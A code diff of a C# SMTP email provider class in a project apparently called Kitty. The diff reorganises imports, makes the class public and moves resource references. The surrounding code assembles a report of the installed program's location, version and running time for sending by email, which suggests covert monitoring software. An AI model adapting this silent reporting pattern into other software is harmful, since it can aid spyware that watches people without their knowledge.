@@ -1,18 +1,18 @@
 ﻿using System.Text;
 using System.Threading.Tasks;
-using Kitty.Stash;
 using System.Net.Mail;
 using System.Net.NetworkInformation;
-using Kitty.Resources;
 using System.Net;
-using Kitty.Win32;
 using System.IO;
 using System.Collections.Generic;
 using System.Diagnostics;
+using Kitty.Types.Stash;
+using Kitty.Win32;
+using Kitty.Types;
 
 namespace Kitty.Net
 {
-    internal sealed class SmtpEmailProvider : IServerProvider
+    public sealed class SmtpEmailProvider : IServerProvider
     {
         private SmtpClient smtpClient;
 
@@ -67,8 +67,8 @@ namespace Kitty.Net
             string kittyLocation = ApplicationInformation.GetLocation();
             string kittyHowLong = ApplicationInformation.GetHowLong();
             string kittyInstalledTime = ApplicationInformation.GetInstalledTime();
-            string mailBody = Properties.Resources.mail_body;
-            string mailBodyElement = Properties.Resources.mail_body_element;
+            string mailBody = Conf.Properties.Resources.mail_body;
+            string mailBodyElement = Conf.Properties.Resources.mail_body_element;
             StringBuilder builder = new StringBuilder();
             builder.AppendLine(string.Format(mailBodyElement, "Version", kittyVersion));
             builder.AppendLine(string.Format(mailBodyElement, "Location", kittyLocation));
